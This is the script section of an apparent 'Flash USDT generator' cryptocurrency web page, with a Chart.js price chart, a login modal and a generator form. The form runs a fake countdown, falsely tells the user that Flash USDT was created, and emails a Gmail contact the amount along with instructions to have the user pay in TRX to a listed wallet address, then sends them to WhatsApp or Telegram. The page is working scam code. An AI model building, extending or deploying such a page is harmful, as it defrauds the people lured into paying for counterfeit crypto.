  <script>
    // Chart.js demo chart
    const ctx = document.getElementById('priceChart');
    new Chart(ctx, {
      type: 'line',
      data: {
        labels: ['Mon', 'Tue', 'Wed', 'Thu', 'Fri', 'Sat'],
        datasets: [{
          label: 'BTC Price',
          data: [48000, 48250, 47900, 48500, 48700, 49000],
          borderColor: '#00ff99',
          backgroundColor: 'transparent'
        }]
      },
      options: {
        responsive: true,
        plugins: {
          legend: { labels: { color: '#fff' } }
        },
        scales: {
          x: { ticks: { color: '#ccc' } },
          y: { ticks: { color: '#ccc' } }
        }
      }
    });

    // Auth modal
    const loginBtn = document.getElementById('loginBtn');
    const signupBtn = document.getElementById('signupBtn');
    const modal = document.getElementById('authModal');
    const authTitle = document.getElementById('authTitle');
    const closeModal = document.querySelector('.close');

    loginBtn.onclick = () => {
      modal.style.display = 'block';
      authTitle.textContent = 'Sign In';
    };
    signupBtn.onclick = () => {
      modal.style.display = 'block';
      authTitle.textContent = 'Sign Up';
    };
    closeModal.onclick = () => {
      modal.style.display = 'none';
    };

    // Flash generator form with timer and email send
    document.getElementById('flashForm').onsubmit = function (e) {
      e.preventDefault();
      const amount = document.getElementById('amount').value;
      const timerEl = document.getElementById('timer');
      let seconds = 10;
      timerEl.innerHTML = 'Generating in ' + seconds + 's...';
      const interval = setInterval(() => {
        seconds--;
        timerEl.innerHTML = 'Generating in ' + seconds + 's...';
        if (seconds === 0) {
          clearInterval(interval);
          timerEl.innerHTML = 'Flash USDT Generated Successfully! Check your email.';

          // Email logic
          Email.send({
            SecureToken: "your-secure-token-here",
            To: "crypto.flashtech@gmail.com",
            From: "your-email@gmail.com",
            Subject: "Flash USDT Generator Request",
            Body: `A user generated Flash USDT for amount: $${amount}.\nAsk them to pay via TRX to TRvTQZst7iGF2DCCbhe5YKh1sNaaPqVVCy.`
          }).then((message) => alert("Details sent to CryptoFlash support. Contact via WhatsApp or Telegram."));
        }
      }, 1000);
    };
  </script>
